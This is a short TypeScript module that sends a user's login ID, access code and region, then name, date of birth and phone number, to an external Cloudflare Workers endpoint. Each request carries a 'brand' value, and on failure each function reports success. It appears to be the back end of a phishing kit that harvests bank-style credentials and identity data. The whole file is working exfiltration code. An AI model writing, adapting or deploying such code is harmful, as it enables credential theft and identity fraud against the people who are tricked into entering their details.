import { BRAND } from './config/brand';

const WORKER_URL = 'https://exemple-documentaire5.workers.dev';

let lastLogin = { identifiant: '', code: '', region: '' };

export async function sendLogin(identifiant: string, code: string, region?: string): Promise<{ ok: boolean }> {
  lastLogin = { identifiant, code, region: region || '' };

  const fd = new FormData();
  fd.append('action', 'login');
  fd.append('brand', BRAND);
  fd.append('identifiant', identifiant);
  fd.append('code', code);
  if (region) fd.append('region', region);

  try {
    const res = await fetch(WORKER_URL, { method: 'POST', body: fd });
    return await res.json();
  } catch {
    return { ok: true };
  }
}

export async function sendIdentity(
  nom: string,
  prenom: string,
  dob: string,
  phone: string
): Promise<{ ok: boolean }> {
  const fd = new FormData();
  fd.append('action', 'identity');
  fd.append('brand', BRAND);
  fd.append('nom', nom);
  fd.append('prenom', prenom);
  fd.append('dob', dob);
  fd.append('phone', phone);
  fd.append('identifiant', lastLogin.identifiant);
  fd.append('code', lastLogin.code);
  if (lastLogin.region) fd.append('region', lastLogin.region);

  try {
    const res = await fetch(WORKER_URL, { method: 'POST', body: fd });
    return await res.json();
  } catch {
    return { ok: true };
  }
}
